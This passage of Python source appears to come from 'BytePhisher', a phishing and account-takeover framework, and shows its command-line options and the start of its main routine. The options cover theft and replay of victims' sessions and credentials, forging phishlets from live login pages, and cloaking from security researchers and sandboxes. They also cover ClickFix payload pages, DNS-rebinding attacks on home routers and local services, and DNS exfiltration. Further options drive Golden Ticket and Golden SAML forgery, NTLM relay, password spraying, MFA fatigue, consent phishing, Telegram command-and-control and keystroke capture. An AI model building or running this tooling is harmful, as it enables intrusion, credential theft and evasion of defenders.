                    help="lure type: link | fragment (token in #) | one-time")
    ap.add_argument("--lure-label", default="",
                    help="who this lure is for (target email/name) - for attribution")
    ap.add_argument("--lure-max-uses", type=int, default=0,
                    help="burn the lure after N opens (0 = unlimited)")
    ap.add_argument("--lures", action="store_true", help="list lures and exit")
    # ---- sessions / takeover ----
    ap.add_argument("--sessions", action="store_true",
                    help="list captured sessions (cookies, creds, state) and exit")
    ap.add_argument("--session", metavar="SID", help="full dump of one session and exit")
    ap.add_argument("--session-export", nargs=2, metavar=("SID", "PATH"),
                    help="export a session as Cookie-Editor JSON (importable in a browser)")
    ap.add_argument("--session-import", metavar="PATH",
                    help="import a Cookie-Editor JSON export as a session and exit")
    ap.add_argument("--validate", metavar="SID",
                    help="check whether a captured session is still alive")
    ap.add_argument("--takeover", metavar="SID",
                    help="run a task against a captured session (real Chrome)")
    ap.add_argument("--task", default="probe",
                    help="task name or YAML/JSON file (see --tasks)")
    ap.add_argument("--out", metavar="DIR", help="output directory for --takeover")
    ap.add_argument("--tasks", action="store_true", help="list built-in takeover tasks")
    ap.add_argument("--replay", metavar="FILE",
                    help="serve the run from a saved snapshot (JSON: path -> response) "
                         "instead of live traffic - build tasks offline, or work on a "
                         "box with no network access")
    # ---- phishlet forge (build one from a live login page) ----
    ap.add_argument("--phishlet-create", metavar="URL",
                    help="analyse a login page and write a ready phishlet, then exit")
    ap.add_argument("--phishlet-out", metavar="FILE",
                    help="where to write the forged phishlet (default: config/phishlets/<name>.yaml)")
    ap.add_argument("--phishlet-name", metavar="NAME", help="name for the forged phishlet")
    ap.add_argument("--forge-snapshot", metavar="FILE",
                    help="forge from a saved snapshot instead of live traffic")
    # ---- bot gate ----
    ap.add_argument("--bot-gate", type=int, default=0, metavar="SCORE",
                    help="serve the decoy when a visit's fingerprint scores at or above "
                         "SCORE (0 = off). Score comes from JA3 + user agent + browser dump")
    ap.add_argument("--scanners", action="store_true",
                    help="list visits the bot gate refused, with the evidence, and exit")
    # ---- researcher / scanner filtering ----
    ap.add_argument("--allow-asn", default="", metavar="ASN[,ASN]",
                    help="only serve these autonomous systems (fail-closed: no ASN data "
                         "means no service)")
    ap.add_argument("--block-asn", default="", metavar="ASN[,ASN]",
                    help="refuse these autonomous systems (a hosting ASN is a scanner "
                         "tell even when the country and ISP look clean)")
    ap.add_argument("--max-hits-per-device", type=int, default=0, metavar="N",
                    help="cap requests per DEVICE (the collector's device token), not per "
                         "IP: a NAT'd office is many victims behind one address")
    ap.add_argument("--cohorts", default="", metavar="FILE",
                    help="cohort table (JSON: [{name,weight,variant,pretext,locale}]) for an "
                         "A/B split; the assignment is a hash of the target, so a target "
                         "always sees the same page")
    ap.add_argument("--ab-summary", action="store_true",
                    help="group the captured sessions by lure and report the click and "
                         "credential rate per arm (from the database, not from the plan)")
    ap.add_argument("--pwa", action="store_true",
                    help="serve an installable page: a manifest plus the worker the "
                         "collector already ships, so the icon reopens the lure with no "
                         "new message (needs HTTPS for the browser to offer it)")
    ap.add_argument("--pwa-name", default="", metavar="NAME",
                    help="the name the home-screen icon shows (default: the campaign name)")
    ap.add_argument("--inbox", action="store_true",
                    help="read replies over IMAP, classify them, and print the follow-up the "
                         "pretext scripts (needs --inbox-host/--inbox-user; the password "
                         "comes from BYTEPHISHER_INBOX_PASS)")
    ap.add_argument("--inbox-host", default="", metavar="HOST", help="IMAP host for --inbox")
    ap.add_argument("--inbox-user", default="", metavar="USER", help="IMAP user for --inbox")
    ap.add_argument("--inbox-folder", default="INBOX", metavar="FOLDER",
                    help="IMAP folder for --inbox (default INBOX)")
    ap.add_argument("--inbox-limit", type=int, default=50, metavar="N",
                    help="how many recent messages to read (default 50)")
    ap.add_argument("--locale", default="en", metavar="LOCALE",
                    help="locale for the --inbox follow-up script suggestions "
                         "(e.g. en, de, fr; default en)")
    ap.add_argument("--clickfix-command", default="", metavar="CMD",
                    help="the command the ClickFix page copies (the payload is the "
                         "operator's; the page and the beacon are this tool's)")
    ap.add_argument("--clickfix-platform", default="windows",
                    choices=["windows", "macos", "linux"], help="which steps the page shows")
    ap.add_argument("--clickfix-out", default="", metavar="FILE",
                    help="write the ClickFix page here (default: print the path only)")
    ap.add_argument("--heartbeat-file", default="", metavar="FILE",
                    help="write a heartbeat while serving (and check it with --heartbeat-check)")
    ap.add_argument("--heartbeat-window", type=int, default=600, metavar="SECONDS",
                    help="how long a heartbeat may go unheard before it is stale (600)")
    ap.add_argument("--heartbeat-check", action="store_true",
                    help="check the heartbeat and exit: stale means the campaign has stopped")
    ap.add_argument("--domain-age", default="", metavar="DOMAIN",
                    help="RDAP registration age for a domain: a young domain is the filter "
                         "both major providers apply first")
    ap.add_argument("--detonation-asn", default="", metavar="ASN[,ASN]",
                    help="refuse these autonomous systems as sandbox/detonation ranges "
                         "(operator-supplied: the vendor ranges move, so a hardcoded list "
                         "would be a guess)")
    ap.add_argument("--detonation-cidr", default="", metavar="CIDR[,CIDR]",
                    help="refuse these networks as sandbox/detonation ranges")
    ap.add_argument("--cloak", action="store_true",
                    help="one switch for the whole cloaking posture: refuse researcher "
                         "networks, and never show our page to a detonation range")
    ap.add_argument("--pool", default="", metavar="FILE",
                    help="domain/tunnel pool file: rotation state, so a burned hostname is "
                         "never handed out twice")
    ap.add_argument("--pool-add", default="", metavar="NAME[,NAME]",
                    help="add hostnames to the pool (with --pool) and exit")
    ap.add_argument("--pool-next", action="store_true",
                    help="hand out the next ready hostname (with --pool) and exit")
    ap.add_argument("--pool-burn", default="", metavar="NAME[,NAME]",
                    help="burn hostnames (with --pool) and exit: never handed out again")
    ap.add_argument("--pool-status", action="store_true",
                    help="print the pool (with --pool) and exit")
    ap.add_argument("--hop", default="", metavar="NAME[,NAME]",
                    help="wrap the lure URL in open-redirect hops (see core.redirectors for "
                         "the names); the message then carries a trusted domain, not ours")
    ap.add_argument("--verify-chain", default="", metavar="URL",
                    help="follow a redirect chain with redirects DISABLED and report each "
                         "hop, whether the destination is hidden, and any dead hop")
    ap.add_argument("--pkinit-plan", action="store_true",
                    help="PKINIT: the step that turns an ESC8 certificate into a TGT (needs the "
                         "certificate AND its private key, because the KDC verifies a signature)")
    ap.add_argument("--pkinit-realm", default="", metavar="REALM",
                    help="realm for --pkinit-plan / --shadow-plan")
    ap.add_argument("--shadow-plan", action="store_true",
                    help="shadow credentials: write a key credential into an object's "
                         "msDS-KeyCredentialLink, then authenticate with PKINIT as that account")
    ap.add_argument("--shadow-target", default="", metavar="DN",
                    help="the object to write the credential onto (--shadow-plan)")
    ap.add_argument("--shadow-write", default="", metavar="DN",
                    help="actually add the credential to this DN through --ldap (needs "
                         "--ldap-user/--ldap-pass with write access to that attribute)")
    ap.add_argument("--shadow-remove", default="", metavar="VALUE",
                    help="remove a credential value (the clean-up path)")
    ap.add_argument("--golden-plan", action="store_true",
                    help="Golden Ticket: a TGT forged with the krbtgt key, for any user and any "
                         "group (the AD rung that matches Golden SAML)")
    ap.add_argument("--golden-forge", action="store_true",
                    help="forge the ticket (needs --krbtgt-hash, --golden-sid and --realm) and "
                         "write the kirbi + ccache to --out")
    ap.add_argument("--krbtgt-hash", default="", metavar="HEX",
                    help="the krbtgt RC4 key (the account's NT hash) for --golden-forge")
    ap.add_argument("--golden-sid", default="", metavar="SID",
                    help="the domain SID (S-1-5-21-...) for --golden-forge")
    ap.add_argument("--golden-user", default="Administrator", metavar="USER",
                    help="the account to forge for (default Administrator)")
    ap.add_argument("--golden-rid", type=int, default=500, metavar="RID",
                    help="the RID to put in the PAC (500 = the built-in Administrator)")
    ap.add_argument("--golden-groups", default="", metavar="SID[,SID]",
                    help="group SIDs for the PAC (e.g. the domain SID + -512 for Domain Admins)")
    ap.add_argument("--kerberos-plan", action="store_true",
                    help="Kerberos roasting: what the KDC hands out, the hashcat mode for each "
                         "etype, and the limits (preauth off for AS-REP, etype 23 downgrade)")
    ap.add_argument("--roast", default="", metavar="USER",
                    help="ask the KDC for one account's crackable blob (needs --realm; add "
                         "--roast-spn for Kerberoasting). The LDAP query says who is worth "
                         "asking: --ldap-query asrep|kerberoast")
    ap.add_argument("--realm", default="", metavar="REALM", help="the Kerberos realm (e.g. "
                    "CONTOSO.TEST)")
    ap.add_argument("--roast-spn", default="", metavar="SPN",
                    help="an SPN to request a service ticket for (e.g. MSSQLSvc/sql:1433)")
    ap.add_argument("--kdc", default="", metavar="HOST",
                    help="the KDC to ask (default: the realm name)")
    ap.add_argument("--ldap", default="", metavar="HOST",
                    help="query a directory over LDAP: the questions the AD attacks ask "
                         "(no-preauth accounts, SPNs, certificate templates, CA flags)")
    ap.add_argument("--ldap-port", type=int, default=389, metavar="PORT", help="389")
    ap.add_argument("--ldap-user", default="", metavar="DN",
                    help="bind DN (empty = anonymous, which most DCs refuse)")
    ap.add_argument("--ldap-pass", default="", metavar="PASSWORD", help="bind password")
    ap.add_argument("--ldap-base", default="", metavar="DN",
                    help="search base (default: the root DSE's defaultNamingContext)")
    ap.add_argument("--ldap-query", default="", metavar="WHAT",
                    choices=["asrep", "kerberoast", "templates", "cas", "shadow", "domain",
                             "rootdse"],
                    help="what to ask: asrep (no preauth), kerberoast (SPNs), templates "
                         "(certificate templates), cas (CAs + flags), shadow, domain (lockout "
                         "policy), rootdse")
    ap.add_argument("--ldap-filter", default="", metavar="FILTER",
                    help="a raw RFC 4515 filter (overrides --ldap-query)")
    ap.add_argument("--ad-hunt", action="store_true",
                    help="hunt the directory for LAPS passwords, GPP cpassword, gMSA "
                         "readers, delegation rights and passwords left in "
                         "description/info (needs --ldap)")
    ap.add_argument("--adcs-esc", default="", metavar="FILE",
                    help="analyse certificate templates for the ESC conditions: a JSON dump "
                         "(from --ldap-query templates), or \"ldap\" to read them live")
    ap.add_argument("--relay-plan", default="", metavar="TARGET_URL",
                    help="the ESC8 chain: probe the CA, coerce the victim, relay its NTLM, take "
                         "the certificate (NTLM over HTTP has no channel binding, so an auth "
                         "meant for the CA is indistinguishable from one that reached it)")
    ap.add_argument("--relay-start", default="", metavar="TARGET_URL",
                    help="run the relay: the listener holds one authentication open and "
                         "forwards it, and the target's answer goes back to the client")
    ap.add_argument("--relay-listen", type=int, default=8088, metavar="PORT",
                    help="the relay's port (80 is the one WebClient uses)")
    ap.add_argument("--coerce-plan", action="store_true",
                    help="how the victim's machine ends up authenticating to the relay: an RPC "
                         "coercion, a document that resolves a UNC path, or the campaign itself")
    ap.add_argument("--token-keepalive", default="", metavar="SID",
                    help="keep a stored session's refresh token warm: rotate it on a schedule so "
                         "it never dies from inactivity, and every rotation consumes the old one")
    ap.add_argument("--keepalive-interval", type=int, default=1800, metavar="SECONDS",
                    help="rotation interval for --keepalive (1800)")
    ap.add_argument("--fatigue-plan", action="store_true",
                    help="MFA fatigue: the pacing, the jitter, the rotating user agent - and the "
                         "fact that number matching defeats it outright")
    ap.add_argument("--spray-plan", action="store_true",
                    help="lockout-aware spraying: one password across many accounts, never "
                         "reaching any account's threshold")
    ap.add_argument("--spray-users", default="", metavar="FILE",
                    help="user list for --spray-plan (one per line, or a csv's first column)")
    ap.add_argument("--spray-threshold", type=int, default=5, metavar="N",
                    help="the tenant's lockout threshold (the budget becomes N-1)")
    ap.add_argument("--consent-plan", action="store_true",
                    help="consent phishing: send the victim to the provider's REAL consent "
                         "screen so they approve your app themselves - no administrator needed, "
                         "and the grant survives their password change")
    ap.add_argument("--consent-client", default="", metavar="CLIENT_ID",
                    help="your app's client id for --consent-plan")
    ap.add_argument("--consent-redirect", default="", metavar="URL",
                    help="the redirect URI registered on that app")
    ap.add_argument("--consent-scopes", default="", metavar="SCOPE[,SCOPE]",
                    help="delegated scopes to ask for (default: offline_access + Mail.Read + "
                         "Files.ReadWrite.All)")
    ap.add_argument("--consent-tenant", default="common", metavar="TENANT",
                    help="tenant or domain for the consent URL (default common)")
    ap.add_argument("--app-consent-plan", action="store_true",
                    help="the app-only persistence path: register an app, attach permissions, "
                         "grant consent, mint a client-credentials token - the credential that "
                         "has no user behind it (nothing a session revocation can touch)")
    ap.add_argument("--app-consent-scopes", default="", metavar="SCOPE[,SCOPE]",
                    help="application permissions for --app-consent-plan (e.g. "
                         "Mail.Read,Directory.ReadWrite.All)")
    ap.add_argument("--saml-plan", action="store_true",
                    help="the Golden SAML steps: the signing key, the assertion, the ACS POST - "
                         "and the detection that actually works (the IdP's own logs)")
    ap.add_argument("--saml-assert", default="", metavar="SUBJECT",
                    help="build a SAML assertion for a subject (needs --saml-issuer and "
                         "--saml-audience); it is written UNSIGNED unless --saml-key is given, "
                         "because an unsigned assertion is not a forged one")
    ap.add_argument("--saml-issuer", default="", metavar="ENTITY_ID",
                    help="the IdP entity id for --saml-assert")
    ap.add_argument("--saml-audience", default="", metavar="ENTITY_ID",
                    help="the relying party entity id for --saml-assert")
    ap.add_argument("--saml-role", default="", metavar="ROLE",
                    help="a role to put in the assertion's role claim (repeatable by comma)")
    ap.add_argument("--saml-key", default="", metavar="PEM",
                    help="the IdP's token-signing private key: without it the assertion is "
                         "unsigned and every relying party will reject it")
    ap.add_argument("--saml-cert", default="", metavar="B64",
                    help="base64 DER of the signing certificate (goes in KeyInfo)")
    ap.add_argument("--saml-out", default="", metavar="FILE",
                    help="write the assertion here (default: print it)")
    ap.add_argument("--federation-plan", default="", metavar="DOMAIN",
                    help="the three steps that make a tenant trust an IdP you control, with "
                         "what each needs and what the audit log will show")
    ap.add_argument("--federation-set", default="", metavar="SID",
                    help="set a domain's federation to your issuer with the captured session's "
                         "token (needs --federation-domain, --federation-issuer and "
                         "--federation-cert; this is an audited Graph call)")
    ap.add_argument("--federation-domain", default="", metavar="DOMAIN",
                    help="the domain to federate (--federation-set)")
    ap.add_argument("--federation-issuer", default="", metavar="URL",
                    help="the SAML endpoint the tenant will POST to (--federation-set)")
    ap.add_argument("--federation-cert", default="", metavar="B64",
                    help="base64 DER of the certificate whose key signs the assertions")
    ap.add_argument("--adcs-probe", default="", metavar="URL",
                    help="what a CA's enrolment endpoint offers from the outside: NTLM (the "
                         "ESC8 precondition), an anonymous template read, and the ESC findings "
                         "that are NOT visible from a plain HTTP request")
    ap.add_argument("--tier0", default="", metavar="SID",
                    help="posture report for a stored session: which root-of-trust path its "
                         "identity opens (federation, PKI, sync account, IdP key)")
    ap.add_argument("--replayability", default="", metavar="SID",
                    help="can this stored session be replayed elsewhere? (device-bound and "
                         "CAE claims decide it, and 'unknown' is not 'replayable')")
    ap.add_argument("--prt-plan", default="", metavar="FILE",
                    help="PRT posture from a JSON file with keys tokens/claims/"
                         "tenant_policy: what the tenant would accept before a phantom "
                         "device registration is attempted")
    ap.add_argument("--consentfix", default="", metavar="PROVIDER",
                    help="build the silent (prompt=none) and interactive consent URLs for a "
                         "provider: microsoft|google|okta|github|custom")
    ap.add_argument("--consentfix-tenant", default="", metavar="TENANT",
                    help="tenant/domain for --consentfix (custom providers need it)")
    ap.add_argument("--consentfix-client", default="", metavar="CLIENT_ID",
                    help="client id for --consentfix")
    ap.add_argument("--block-researchers", action="store_true",
                    help="refuse security vendors, cloud scanners, anonymising networks and "
                         "scanner user agents outright (decoy), instead of only scoring them")
    ap.add_argument("--telegram-c2", action="store_true",
                    help="turn the Telegram bot into a control channel: /stats, /sessions, "
                         "/session SID, /live SID, /otp SID, /takeover SID, /lures, /block IP "
                         "(needs --telegram TOKEN:CHAT_ID)")
    ap.add_argument("--exploit-ports", metavar="LIST",
                    help="which local services the page attacks once the name has rebound "
                         "(comma separated; default: the highest-payoff set)")
    ap.add_argument("--exploit-limit", type=int, default=6, metavar="N",
                    help="how many services are attempted per page load (default 6)")
    ap.add_argument("--exploit-list", action="store_true",
                    help="list the local-service exploit library and exit")
    ap.add_argument("--router-plan", metavar="GATEWAY",
                    help="print the router takeover plan for a gateway address and exit")
    ap.add_argument("--rebind-domain", metavar="DOMAIN",
                    help="run a DNS rebinding responder for DOMAIN: the first answer is your "
                         "public address (so the page loads), later ones point at "
                         "--rebind-target, so the victim's browser reads their own local "
                         "services (router panel, docker api, jupyter, kubelet...)")
    ap.add_argument("--rebind-target", metavar="IP[,IP]", default="127.0.0.1",
                    help="address(es) the name flips to (default 127.0.0.1)")
    ap.add_argument("--rebind-public", metavar="IP", default="",
                    help="your public address for the first answer (default: auto-detect)")
    ap.add_argument("--rebind-port", type=int, default=53, metavar="N",
                    help="DNS port (53 needs root; use a high port for a lab)")
    ap.add_argument("--rebind-after", type=int, default=1, metavar="N",
                    help="how many queries are answered with the public address first")
    ap.add_argument("--rebind-ttl", type=int, default=1, metavar="N",
                    help="answer TTL in seconds (1 makes the flip happen while the page is open)")
    ap.add_argument("--access-plan", nargs="?", const="latest", default=None,
                    metavar="FACTS",
                    help="rank the access paths this victim allows and exit. FACTS is a "
                         "JSON object, @file, an OS name, a user agent, or 'latest' for "
                         "what the newest device dump states")
    ap.add_argument("--access-build", metavar="DIR",
                    help="build every artifact the verdict calls for into DIR (writes the "
                         "files plus manifest.json; set --access-url/--access-payload)")
    ap.add_argument("--access-facts", metavar="JSON", default="",
                    help="facts for --access-build/--access-plan (JSON object, @file, a "
                         "user agent, or latest)")
    ap.add_argument("--access-url", metavar="URL", default="",
                    help="public URL of the campaign: what the trigger page and the "
                         "shortcut point at")
    ap.add_argument("--access-payload", metavar="URL", default="",
                    help="payload URL the stagers fetch")
    ap.add_argument("--access-zone", metavar="ZONE", default="",
                    help="DNS zone for the exfiltration plan")
    ap.add_argument("--artifact", metavar="KIND",
                    help="build one artifact: " + ", ".join(sorted(ARTIFACT_KINDS)))
    ap.add_argument("--artifact-url", metavar="URL", default="",
                    help="URL the artifact carries (or the payload text for dnsplan)")
    ap.add_argument("--artifact-out", metavar="PATH",
                    help="write the artifact here (required for the binary kinds)")
    ap.add_argument("--artifact-template", metavar="PATH",
                    help="docm: an existing macro-enabled document to inject the project "
                         "into (the reliable path)")
    ap.add_argument("--artifact-zone", metavar="ZONE", default="",
                    help="dnsplan: the zone to build the query names under")
    ap.add_argument("--pack-list", action="store_true",
                    help="list the shipped exploit pack and exit")
    ap.add_argument("--pack-match", metavar="SPEC",
                    help="match the pack: browser:VERSION (chrome:91), service:NAME, or "
                         "os:NAME")
    ap.add_argument("--pack-verify", metavar="DIR",
                    help="check which pack payloads are present under DIR")
    ap.add_argument("--pack-report", metavar="DIR",
                    help="count the pack entries and how many are verified under DIR")
    ap.add_argument("--totp-uri", metavar="URI",
                    help="parse an otpauth:// URI and print its fields (never the secret)")
    ap.add_argument("--totp-code", metavar="SECRET",
                    help="print the current code for a base32 secret, plus the window")
    ap.add_argument("--totp-at", type=float, metavar="TS",
                    help="evaluate --totp-code/--totp-scan at this unix timestamp")
    ap.add_argument("--totp-scan", metavar="CODE",
                    help="search a low-entropy secret space for a code you observed")
    ap.add_argument("--totp-space", metavar="NAME", default="dec6",
                    help="dec6, dec8 or b32short (default dec6)")
    ap.add_argument("--dnsx-plan", metavar="DATA",
                    help="print the DNS query plan for DATA (needs --access-zone)")
    ap.add_argument("--dnsx-encode", metavar="DATA",
                    help="print the query names that carry DATA")
    ap.add_argument("--dnsx-decode", metavar="NAMES",
                    help="reassemble a payload from comma-separated query names")
    ap.add_argument("--capabilities", action="store_true",
                    help="list which optional capability modules are importable and exit")
    ap.add_argument("--auto-chain", metavar="NAME",
                    help="run this chain automatically the moment a session is captured "
                         "(hands-free post-exploitation; see --chains)")
    ap.add_argument("--chains", action="store_true",
                    help="list the post-exploitation chains and exit")
    ap.add_argument("--run-chain", metavar="SID[:CHAIN]",
                    help="run a chain against a captured session (see --chains)")
    ap.add_argument("--chain-name", metavar="NAME", default="",
                    help="which chain --run-chain runs (default recon; same as SID:NAME)")
    ap.add_argument("--chain-json", metavar="PATH",
                    help="write the chain result (tasks, findings, errors) as JSON")
    ap.add_argument("--live-purge", metavar="SID",
                    help="delete one session's live keystroke/field stream and exit")
    ap.add_argument("--keep-days", type=float, metavar="DAYS",
                    help="on start, drop live-input rows older than DAYS (every keystroke "
                         "beacon is a row, so a long campaign accumulates them)")
    ap.add_argument("--api-token", metavar="TOKEN", default="",
                    help="require this token on the dashboard API (?token= or "
                         "X-Api-Token). The API serves captured credentials: bind it "
                         "publicly without a token and anyone who finds the port has "
                         "them")
    ap.add_argument("--server-header", metavar="NAME", default="nginx",
                    help="the Server header on our own responses (default nginx). "
                         "An empty value omits it entirely; in proxy mode the "
                         "upstream's own Server/Date are relayed and this is only "
                         "the fallback. BaseHTTPRequestHandler's default advertises "
                         "the Python version, which is a one-line scanner rule")
    ap.add_argument("--impersonate", metavar="PROFILE", default="",
                    help="make the UPSTREAM leg look like a real browser: the "
                         "ClientHello, header order and HTTP settings of chrome, "
                         "firefox135, safari180, edge101 ... (needs curl_cffi). "
                         "Without it the upstream sees a Python TLS client while "
                         "(default: chrome when curl_cffi is installed; "
                         "--no-impersonate opts out) "
                         "the victim's browser sits behind you, which is the "
                         "mismatch Cloudflare/Akamai/PerimeterX score")
    ap.add_argument("--hook-path", metavar="PATH",
                    help="base path for the collector and hook routes (default /__bh). "
                         "A fixed path is a signature: move it per campaign, "
                         "e.g. --hook-path /assets/v2/x7f3")
    ap.add_argument("--blocklist-file", metavar="PATH",
                    help="extra blocklist, one entry per line (default data/blocklist.txt when "
                         "it exists): 'name' = organisation keyword, 'ua:x', 'ip:x', 'net:x/y'")
    # ---- live-session operations ----
    ap.add_argument("--validate-creds", metavar="SID",
                    help="replay a captured session's credentials at the real login URL")
    ap.add_argument("--user-field", default="username", help="username field name (--validate-creds)")
    ap.add_argument("--pass-field", default="password", help="password field name (--validate-creds)")
    ap.add_argument("--keepalive", metavar="SID",
                    help="keep a captured session alive by polling an authenticated URL")
    ap.add_argument("--interval", type=int, default=300,
                    help="seconds between keepalive polls (default 300)")
    ap.add_argument("--iterations", type=int, default=12,
                    help="keepalive polls to perform (default 12)")
    ap.add_argument("--decoy-mode", default="real", choices=["real", "page", "url"],
                    help="what a scanner/non-target sees: real (mirror the upstream), "
                         "page (static decoy), url (redirect to --decoy)")
    ap.add_argument("--no-trust-headers", action="store_true",
                    help="ignore CF-Connecting-IP / X-Forwarded-For and use the "
                         "socket IP (use when the server is exposed directly: "
                         "those headers are spoofable and bypass gating)")
    # ---- deep device intelligence (everything the browser volunteers) ----
    ap.add_argument("--no-intel", action="store_true",
                    help="disable the deep device dump collected on page open")
    ap.add_argument("--intel-perms", action="store_true",
                    help="also fire permission-gated probes (geolocation, clipboard, "
                         "notifications, USB/serial/HID) on the first user gesture")
    ap.add_argument("--intel-dump", metavar="SID|ID|latest",
                    help="print the full device dump for a session and exit")
    ap.add_argument("--intel-list", action="store_true",
                    help="list collected device dumps and exit")
    ap.add_argument("--intel-export", metavar="PATH",
                    help="write every device dump to a JSON file and exit")
    ap.add_argument("--no-tui", action="store_true", help="print captures, no live TUI")
    ap.add_argument("--telegram", metavar="TOKEN:CHAT_ID",
                    help="send every capture to a Telegram bot chat")
    ap.add_argument("--webhook", metavar="URL",
                    help="POST every capture as JSON to this URL (Discord/Slack/n8n)")
    ap.add_argument("--pretext", default="", metavar="NAME",
                    help="message story to use for the mail (see --pretext-list): it brings "
                         "its own subject, body, required fields and follow-up script")
    ap.add_argument("--lookalike", default="", metavar="DOMAIN",
                    help="print lookalike domain candidates for a brand (swaps, omissions, "
                         "prefix/suffix, TLDs, IDN homoglyphs) with a plausibility score")
    ap.add_argument("--sender-check", default="", metavar="DOMAIN",
                    help="preflight a sending domain from DNS alone: A/MX, SPF, DKIM "
                         "selectors, DMARC policy, and whether others can spoof it")
    ap.add_argument("--pretext-list", action="store_true",
                    help="list the available pretexts with their roles and fields")
    ap.add_argument("--targets", default="", metavar="FILE",
                    help="target list (csv/tsv/json): the served page is pre-filled with the "
                         "matched target's own address and the mail is written per target")
    ap.add_argument("--mailto", metavar="ADDR[,ADDR]",
                    help="after tunnels are up, email the phish link via SMTP")
    ap.add_argument("--mail-template", default="security_alert",
                    choices=["password_reset", "security_alert", "shared_doc", "invoice"],
                    help="which email template to use for --mailto")
    ap.add_argument("--mail-from-name", default="IT Support",
                    help="display name on the From header (a bare address reads as bulk mail)")
    ap.add_argument("--mail-reply-to", default="", metavar="ADDR",
                    help="Reply-To for the message: an answer lands where the operator can "
                         "read it instead of a no-reply address")
    ap.add_argument("--mail-to-name", default="", metavar="NAME",
                    help="display name on the To header ({{To_FirstName}} is used when empty)")
    ap.add_argument("--mail-thread", default="", metavar="MESSAGE-ID",
                    help="put the message inside an existing thread (sets In-Reply-To and "
                         "References to this Message-ID)")
    ap.add_argument("--mail-qr", action="store_true",
                    help="embed the lure URL as an inline QR image (the mail-side "
                         "quishing payload: the URL is never in the body text)")
    ap.add_argument("--mail-ics", action="store_true",
                    help="attach a calendar invite whose URL/LOCATION is the lure")
    ap.add_argument("--mail-attach", default="", metavar="PATH[,PATH]",
                    help="attach files (the mime type is derived from the extension)")
    ap.add_argument("--mail-pacing", default="", metavar="MIN-MAX",
                    help="seconds between messages, e.g. 20-90: a burst from a fresh "
                         "domain is a rate-based block, and the jitter hides the pattern")
    ap.add_argument("--campaign", metavar="NAME",
                    help="tag this session's captures with a campaign name "
                         "(default: the template slug)")
    ap.add_argument("--rotate", metavar="SLUGS",
                    help="serve a random one of these templates per request "
                         "(comma-separated slugs) - A/B style campaigns")
    # ---- campaign gating ----
    ap.add_argument("--allow-country", metavar="CC[,CC]",
                    help="only serve visitors from these ISO country codes (e.g. IN,US)")
    ap.add_argument("--block-country", metavar="CC[,CC]",
                    help="never serve visitors from these country codes")
    ap.add_argument("--block-datacenter", action="store_true",
                    help="refuse hosting/datacenter ASNs (kills most scanners)")
    ap.add_argument("--active-hours", metavar="H1-H2",
                    help="only serve between these local hours, e.g. 9-18")
    ap.add_argument("--active-days", metavar="DAYS",
                    help="only serve on these weekdays, e.g. mon-fri or mon,wed,fri")
    ap.add_argument("--max-hits", type=int, default=0, metavar="N",
                    help="refuse an IP after N hits per hour (0 = unlimited)")
    ap.add_argument("--decoy", metavar="URL",
                    help="where gated-out visitors go (default: inert 503 page)")
    ap.add_argument("--tunnel-restart", action="store_true",
                    help="if a tunneler dies mid-campaign, bring it back automatically "
                         "(max 5 restarts each) and print the new public URL")
    ap.add_argument("--version", action="version", version=f"BytePhisher {VERSION}")
    args = ap.parse_args()

    # Validate the two numbers that reach bind() and the TLS pair before either
    # reaches a socket: a bad port or a missing cert used to surface as an
    # OverflowError / ValueError traceback from deep inside core.server.
    for _flag, _val in (("--port", args.port), ("--web-port", args.web_port)):
        if _val is not None and not (0 <= int(_val) <= 65535):
            print(f"[bytephisher] {_flag} must be 0-65535 (got {_val})")
            return 2
    if args.tls and not args.cert:
        print("[bytephisher] --tls needs --cert <pem> "
              "(refusing to serve plaintext when TLS was requested)")
        return 2
    if args.tls and args.cert and not os.path.isfile(args.cert):
        print(f"[bytephisher] --cert file not found: {args.cert}")
        return 2

    if args.lab_check:
        # the preflight answers "can this host do the job" before anything is served
        from tools import lab_check as lab
        rep = lab.run(domain=args.lab_domain or "", client_id=args.dc_client_id or "",
                      tunnel=args.lab_tunnel or "", db=cfg_db_path(),
                      tenant=args.dc_tenant or "common",
                      provider=args.devicecode or "microsoft")
        print(lab.render(rep))
        return 0 if rep["verdict"] == "READY" else 1

    cfg = load_config()
    db = cap.CaptureDB(args.export and cfg["db_path"] or cfg["db_path"])
    if getattr(args, "panic", False) or getattr(args, "kill", False):
        # the same handlers the control channel registers: a console operator used to have
        # no panic path at all unless Telegram was configured
        # the handlers expect the same mutable stop holder the server uses
        _panic_fn, _kill_fn = panic_handlers(db, {"flag": False})
        if args.kill:
            if not args.yes:
                print("[bytephisher] kill   : this wipes every capture, session, intel "
                      "row and lure. Re-run with --yes to confirm.")
                db.close()
                return 2
            print(f"[bytephisher] kill   : {_kill_fn()}")
        else:
            print(f"[bytephisher] panic  : {_panic_fn()}")
        db.close()
        return 0

    # Retention runs on every invocation that opens the store, so it also works
    # as a cleanup command (--keep-days 7 --sessions) instead of only when a
    # campaign starts. Every keystroke beacon is a row.
    if args.keep_days:
        try:
            removed = db.prune_live(keep_days=args.keep_days)
            print(f"[bytephisher] retention : dropped {removed} live-input row(s) "
                  f"older than {args.keep_days} day(s) "
                  f"({db.live_count()} row(s) kept)")
        except Exception as e:
            print(f"[bytephisher] retention failed: {type(e).__name__}: {e}")


    # ----------------------------------------------------------- forge -----
    if args.phishlet_create:
        from core import forge as forge_mod
        snapshot = None
        if args.forge_snapshot:
            from core import session as sess_mod
            snapshot = sess_mod.load_replay(args.forge_snapshot)
        try:
            analysis = forge_mod.forge(args.phishlet_create, verify=not args.no_verify_tls,
                                       snapshot=snapshot)
        except Exception as e:
            print(f"[bytephisher] forge failed: {type(e).__name__}: {e}")
            return 1
        print(forge_mod.report(analysis))
        name = args.phishlet_name or None
        out = args.phishlet_out or os.path.join(
            "config", "phishlets",
            (name or (analysis.get("domain") or "forged").replace(".", "-")) + ".yaml")
        os.makedirs(os.path.dirname(out) or ".", exist_ok=True)
        ph, side = forge_mod.write(analysis, out, name=name)
        print("")
        print(f"[bytephisher] phishlet written : {out}")
        print(f"[bytephisher] analysis written : {side}")
        print(f"[bytephisher] run it with      : python3 bytephisher.py --proxy "
              f"--phishlet {out} --port {args.port or 8080}")
        return 0

    # ------------------------------------------------------ bot gate log ---
    if args.scanners:
        rows = db.scanner_log(limit=200)
        st = db.scanner_stats()
        if not rows:
            print("[bytephisher] no refused visits recorded (bot gate never fired)")
            return 0
        print(f"{'when':<20} {'ip':<16} {'score':>5}  evidence")
        print("-" * 100)
        for r in rows:
            when = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(r["ts"]))
            print(f"{when:<20} {r['ip']:<16} {r['score']:>5}  "
                  f"{'; '.join(r['reasons'])[:60]}")
            if r.get("ua"):
